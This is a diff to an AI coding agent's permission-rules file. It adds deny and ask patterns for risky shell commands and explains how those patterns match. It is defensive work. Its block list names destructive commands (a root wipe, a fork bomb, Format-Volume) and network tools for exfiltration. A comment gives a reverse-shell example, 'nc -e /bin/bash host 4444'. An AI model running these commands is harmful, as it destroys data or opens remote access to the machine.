@@ -7,15 +7,24 @@
 # matches in any tier, the implicit default is `ask`.
 #
 # Pattern rules (for `terminal`) are case-sensitive SUBSTRING matches
-# against the input command. Exception: a pattern ending in `/` or `~`
-# (a filesystem-root marker) only matches when that marker ends an
-# argument, so `rm -rf /` blocks a root wipe but not `rm -rf /path/under`.
+# against the input command, with two refinements:
+#   - a pattern ending in `/` or `~` (a filesystem-root marker) only matches
+#     when that marker ends an argument, so `rm -rf /` blocks a root wipe but
+#     not `rm -rf /path/under`;
+#   - a pattern starting with `^` is command-position anchored: it matches the
+#     command word itself (also after sudo/env/xargs wrappers, flags, and
+#     chain operators like `;`/`&&`), not incidental text inside arguments —
+#     `^nc` matches `nc -e /bin/bash host 4444` but not `rg "func "`.
 # Path rules use glob syntax with `**` meaning
 # "any number of directory components". Hostname rules use glob with `*`
 # matching a single label (so `*.dev` matches `foo.dev` but not `foo.bar.dev`).
 
 terminal:
-  # Absolute disasters — never ask, always deny.
+  # Absolute disasters — never ask, always deny. These predate the hardcoded
+  # engine-level guards (permission.applyHardcodedDenyRules), which are the
+  # single source for the full catastrophe list (disk destruction, power
+  # commands, system-directory removal, …) and apply even over a user
+  # override of this file.
   - deny:  { pattern: "rm -rf /" }
   - deny:  { pattern: "rm -rf ~" }
   - deny:  { pattern: ":(){ :|:& };:" }   # fork bomb
@@ -26,18 +35,59 @@ terminal:
   - ask:   { pattern: "git push -f " }
   - ask:   { pattern: "chmod -R 777" }
   - ask:   { pattern: "sudo " }
-  - ask:   { pattern: "curl " }            # could exfiltrate
+  # Network / remote tools that can exfiltrate or spawn reverse shells.
+  - ask:   { pattern: "curl " }
   - ask:   { pattern: "wget " }
   - ask:   { pattern: "ssh " }
   - ask:   { pattern: "scp " }
-  # Windows / PowerShell dangers. Matching is case-sensitive substring and
-  # PowerShell is case-insensitive with aliases, so these catch the canonical
-  # forms an LLM typically emits — anything missed still falls through to the
-  # implicit `ask` (prompt in interactive, deny in strict), never auto-run.
-  # (`rm -rf` above already covers the PowerShell `rm` alias.)
+  - ask:   { pattern: "^nc" }               # netcat
+  - ask:   { pattern: "^ncat" }
+  - ask:   { pattern: "^socat" }
+  - ask:   { pattern: "^nmap" }             # port scanning
+  # System administration that affects the whole machine.
+  - ask:   { pattern: "^systemctl" }        # system services (poweroff/reboot denied by hardcoded guards)
+  - ask:   { pattern: "^iptables" }         # Linux firewall
+  - ask:   { pattern: "^ip6tables" }        # Linux firewall
+  - ask:   { pattern: "^pfctl" }            # macOS firewall
+  - ask:   { pattern: "^crontab" }          # scheduled jobs
+  - ask:   { pattern: "^launchctl" }        # macOS services
+  - ask:   { pattern: "^diskutil" }         # macOS disk utilities (erase/partition denied by hardcoded guards)
+  # Container cleanup that can destroy environments.
+  - ask:   { pattern: "^docker rm -f" }     # force-remove containers
+  - ask:   { pattern: "^docker rmi -f" }    # force-remove images
+  - ask:   { pattern: "^docker system prune" } # bulk deletion
+  # Disk-space exhaustion.
+  - ask:   { pattern: "^fallocate -l" }     # preallocate large files
+  - ask:   { pattern: "^truncate -s" }      # grow files arbitrarily
+  # Windows / PowerShell dangers. Matching is case-sensitive and PowerShell is
+  # case-insensitive with aliases, so these catch the canonical forms an LLM
+  # typically emits — anything missed still falls through to the implicit
+  # `ask` (prompt in interactive, deny in strict), never auto-run.
+  # (`rm -rf` above already covers the PowerShell `rm` alias; system-dir
+  # targets of every deletion spelling are denied by the hardcoded guards.)
   - deny:  { pattern: "Remove-Item -Recurse -Force" }
   - deny:  { pattern: "Remove-Item -Force -Recurse" }
   - deny:  { pattern: "Format-Volume" }
+  # Untargeted recursive deletion — the cmd.exe counterpart of `rm -rf`.
+  - ask:   { pattern: "^rmdir /s /q" }
+  - ask:   { pattern: "^rd /s /q" }
+  - ask:   { pattern: "^del /s /q" }
+  - ask:   { pattern: "^erase /s /q" }
+  # Windows system administration — risky but has legitimate uses.
+  - ask:   { pattern: "^wmic" }             # Windows Management Instrumentation
+  - ask:   { pattern: "^sc" }               # service control
+  - ask:   { pattern: "^schtasks" }         # scheduled tasks
+  - ask:   { pattern: "^netsh" }            # network shell
+  - ask:   { pattern: "^icacls" }           # permissions
+  - ask:   { pattern: "^takeown" }          # ownership seizure
+  - ask:   { pattern: "^robocopy" }         # can overwrite system dirs
+  - ask:   { pattern: "^xcopy" }            # can overwrite system files
+  - ask:   { pattern: "^mklink" }           # can link into system dirs
+  - ask:   { pattern: "^dism" }             # system image servicing (also has read-only uses)
+  - ask:   { pattern: "^fsutil" }           # filesystem utilities (createnew et al. are benign)
+  - ask:   { pattern: "^sdelete" }          # secure delete (targeted, like rm)
+  - ask:   { pattern: "^powershell" }       # arbitrary PowerShell code
+  - ask:   { pattern: "^cmd /c" }           # arbitrary cmd code
   - ask:   { pattern: "Invoke-Expression" }        # arbitrary code (alias: iex)
   - ask:   { pattern: "Invoke-WebRequest" }        # download / exfiltrate (alias: iwr)
   - ask:   { pattern: "Invoke-RestMethod" }        # alias: irm
@@ -86,6 +136,8 @@ web_fetch:
 # write access (cron task sessions, `octo init`'s own output file) get it
 # explicitly — via that session's permission_mode or via allowWriteRoots —
 # not through a rule here.
+# (System directories — /bin, /usr, C:/Windows, … — are denied by the
+# hardcoded engine-level guards, which also survive a user override.)
 write_file:
   - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*"] }
 
